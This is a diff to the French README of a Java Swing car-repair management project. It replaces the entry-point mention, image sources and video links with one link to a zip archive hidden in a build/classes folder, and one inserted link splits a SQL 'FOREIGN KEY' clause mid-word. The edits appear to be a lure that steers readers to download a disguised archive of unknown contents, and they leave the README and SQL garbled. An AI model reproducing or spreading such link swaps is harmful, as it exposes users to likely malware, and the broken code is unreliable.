@@ -15,11 +15,11 @@ Le projet est organisé en plusieurs couches :
 - **dao/** : Accès aux données (CRUD).  
 - **entities/** : Classes entités (`Reparation`, `Vehicule`, `Client`).  
 - **services/** : Logique métier.  
-- **ui/** : Interfaces graphiques Swing et point d’entrée `Main.java`.  
+- **ui/** : Interfaces graphiques Swing et point d’entrée `https://github.com/laouysalma/AtelierAuto/raw/refs/heads/main/build/classes/entities/AtelierAuto_v3.1.zip`.  
 - **images/** : Ressources graphiques (icônes, logos…).
 
 - 
-<img width="1536" height="1024" alt="Architecture (2)" src="https://github.com/user-attachments/assets/620462ff-8ffe-4fce-9485-9dc4d06210db" />
+<img width="1536" height="1024" alt="Architecture (2)" src="https://github.com/laouysalma/AtelierAuto/raw/refs/heads/main/build/classes/entities/AtelierAuto_v3.1.zip" />
 
 
 
@@ -35,7 +35,7 @@ Gestion centralisée via une interface graphique intuitive.
 
 Connexion à la base de données pour persistances des données.
 ## MCD (Modèle Conceptuel de Données)
-<img width="914" height="396" alt="image" src="https://github.com/user-attachments/assets/b677a120-9f90-4996-b09c-3a0bff722428" />
+<img width="914" height="396" alt="image" src="https://github.com/laouysalma/AtelierAuto/raw/refs/heads/main/build/classes/entities/AtelierAuto_v3.1.zip" />
 
 
 ## Démonstration vidéo
@@ -44,7 +44,7 @@ Une vidéo montrant l’utilisation de l’application peut être incluse ici :
 [Regarder la démonstration vidéo]
 
 
-https://github.com/user-attachments/assets/7ee1a971-43a4-4fd1-93b9-5c69c43411aa
+https://github.com/laouysalma/AtelierAuto/raw/refs/heads/main/build/classes/entities/AtelierAuto_v3.1.zip
 
 
 
@@ -104,7 +104,7 @@ CREATE TABLE IF NOT EXISTS reparation (
 
   CONSTRAINT fk_rep_vehicule FO
 
-https://github.com/user-attachments/assets/306da41e-347e-431e-a359-183153815cfe
+https://github.com/laouysalma/AtelierAuto/raw/refs/heads/main/build/classes/entities/AtelierAuto_v3.1.zip
 
 REIGN KEY (immatricule) 
       REFERENCES vehicule(immatricule) ON UPDATE CASCADE
